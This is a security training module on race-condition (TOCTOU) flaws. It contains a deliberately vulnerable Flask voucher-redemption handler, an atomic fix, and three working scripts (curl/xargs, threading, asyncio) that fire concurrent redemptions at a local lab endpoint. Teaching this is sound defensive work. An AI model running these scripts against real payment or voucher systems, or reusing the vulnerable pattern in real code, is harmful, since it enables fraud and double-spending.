Module 20 — Race Conditions

Explore how TOCTOU (Time-of-Check to Time-of-Use) flaws allow attackers to exploit timing gaps in concurrent operations.

The Vulnerability Scanners Cannot Find

Race conditions are fundamentally different from every other vulnerability in this course. SQLi, XSS, SSRF — they are all about what you send. Race conditions are about when you send it. The payload is a perfectly normal request. The exploit is sending it at exactly the right moment — or more precisely, sending many copies of it at the same moment.

This is why automated vulnerability scanners almost never find race conditions. They test one request at a time and observe the response. Race conditions only manifest when multiple requests hit the same endpoint simultaneously, creating a window where the application's assumptions about state are temporarily wrong.

TOCTOU — Time-of-Check to Time-of-Use

The core pattern is called TOCTOU: the server checks a condition (does the user have enough balance? Is the coupon still valid?), then uses that condition to take action (deduct balance, mark coupon as redeemed). Between the check and the action, there is a gap — maybe a few milliseconds, maybe longer if there is a database query or network call in between. If another request slides into that gap, it will also pass the check, because the first request has not yet updated the state.

Vulnerable Code

@app.route('/redeem', methods=['POST'])
def redeem():
    code = request.form['code']

    # CHECK: is the voucher valid and unredeemed?
    voucher = db.execute(
        'SELECT * FROM vouchers WHERE code=? AND redeemed=0', (code,)
    ).fetchone()

    if not voucher:
        return 'Invalid or already redeemed'

    # ← TOCTOU GAP: between the CHECK above and the USE below,
    #   another request can also pass the check
    #   because redeemed is still 0 in the database

    # USE: mark as redeemed and credit the account
    db.execute('UPDATE vouchers SET redeemed=1 WHERE code=?', (code,))
    db.execute('UPDATE accounts SET balance=balance+? WHERE id=?',
               (voucher['value'], user_id))
    db.commit()
    return 'Voucher redeemed!'

If 20 requests arrive simultaneously, they all execute the SELECT at roughly the same time. They all see redeemed=0. They all pass the check. They all credit the account. One voucher, 20 credits. That is the race condition.

Safe Code — Atomic Operations

@app.route('/redeem', methods=['POST'])
def redeem():
    code = request.form['code']

    # SAFE: check and modify in a SINGLE atomic query
    # Only ONE of the concurrent requests will match the WHERE clause
    result = db.execute(
        'UPDATE vouchers SET redeemed=1 WHERE code=? AND redeemed=0', (code,)
    )

    if result.rowcount == 0:
        return 'Invalid or already redeemed'

    # Only the winning request reaches here
    db.execute('UPDATE accounts SET balance=balance+? WHERE id=?',
               (voucher_value, user_id))
    db.commit()
    return 'Voucher redeemed!'

The fix combines the check and the modification into a single UPDATE...WHERE query. The database guarantees this is atomic — only one of the concurrent requests will successfully update the row (because after the first one sets redeemed=1, the others' WHERE clause no longer matches).

Real-World Race Condition Scenarios

  • Double-spend: Redeem the same gift card, coupon, or promotional code multiple times
  • Overdraft: Submit multiple withdrawal requests simultaneously to drain more than the available balance
  • Duplicate registration: Create multiple accounts with a "unique" username or email by racing the uniqueness check
  • Like/vote inflation: "Like" a post hundreds of times by sending concurrent requests before the duplicate check runs
  • Invitation abuse: Use a single-use invite link multiple times
  • File upload overwrite: Upload two files simultaneously with name collision logic that fails under concurrency
Real Story: In 2023, James Kettle from PortSwigger published groundbreaking research on "single-packet attacks" for HTTP/2. By sending multiple HTTP/2 requests in a single TCP packet, he could eliminate network jitter and create extremely tight race windows — often just a few microseconds. This made race conditions exploitable even when the TOCTOU gap was vanishingly small. The technique was added to Burp Suite's Turbo Intruder tool.

Exploitation Techniques

# Method 1: curl with xargs for parallel requests
seq 20 | xargs -P20 -I{} curl -sX POST http://localhost:5013/redeem \
  -d "code=GIFT-CARD-123"

# Method 2: Python threading for precise timing
import threading, requests

def redeem():
    requests.post('http://localhost:5013/redeem',
                  data={'code': 'GIFT-CARD-123'})

threads = [threading.Thread(target=redeem) for _ in range(20)]
for t in threads: t.start()   # Launch all at once
for t in threads: t.join()    # Wait for completion
# Method 3: asyncio for maximum concurrency
import asyncio, aiohttp

async def race():
    async with aiohttp.ClientSession() as session:
        tasks = [
            session.post('http://localhost:5013/redeem',
                        data={'code': 'GIFT-CARD-123'})
            for _ in range(50)
        ]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status, await r.text())

Impact: Race conditions cause financial loss (double-spend), data corruption, privilege escalation, and bypass of security checks. They are notoriously difficult to detect with automated scanning and often require manual testing with concurrent request tools. In bug bounty programs, race conditions on financial operations (payments, credits, transfers) are typically rated as High or Critical severity.
